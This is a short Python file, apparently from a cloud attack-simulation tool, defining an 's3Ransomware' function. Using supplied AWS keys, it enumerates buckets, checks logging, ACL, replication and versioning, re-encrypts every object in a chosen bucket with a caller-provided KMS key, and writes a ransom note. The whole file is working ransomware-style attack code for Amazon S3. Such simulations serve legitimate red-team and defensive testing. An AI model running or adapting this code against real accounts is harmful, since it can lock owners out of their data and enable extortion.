import boto3
import botocore
import time

def s3Ransomware(key, secret, origin_bucket_name, logs, resources): 

    s3 = boto3.resource('s3', aws_access_key_id =key, aws_secret_access_key = secret)
    client = boto3.client('s3', aws_access_key_id =key, aws_secret_access_key = secret)

    time.sleep(20)
    buckets = []
    try:
        response = client.list_buckets()
        for bucket in response['Buckets']:
            buckets.append(bucket)
    except botocore.exceptions.ClientError as error:
            logs.append(error.response)
            return

    for bucket in buckets:
        try:
            client.get_bucket_logging(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
            break

    for bucket in buckets:
        try:
            rsp = client.get_bucket_acl(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
            break

    for bucket in buckets:
        try:
            rsp = client.get_bucket_replication(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
            continue
    
    for bucket in buckets:
        try:
            rsp = client.get_bucket_versioning(Bucket=bucket['Name'])
        except botocore.exceptions.ClientError as error:
              continue
     
    try:
        origin = s3.Bucket(origin_bucket_name)
        for obj in origin.objects.all():
            response = client.get_object(Bucket=origin_bucket_name, Key=obj.key)
            response = client.copy_object(Bucket=origin_bucket_name, 
                                                CopySource=f"{origin_bucket_name}/{obj.key}", Key = obj.key,
                                                ServerSideEncryption='aws:kms',SSEKMSKeyId=resources['kms'][0])
    
        final_file_content = 'thank you for using zerotoimpact policy_ransom_exploit attack scenario..'
        final_file_key = 'ransom-note.txt'
        client.put_object(Bucket=origin_bucket_name, Key=final_file_key, Body=final_file_content)
        logs.append(f"Added ransome note {final_file_key} to {origin_bucket_name}")
    except botocore.exceptions.ClientError as error:
        logs.append(error.response)



    

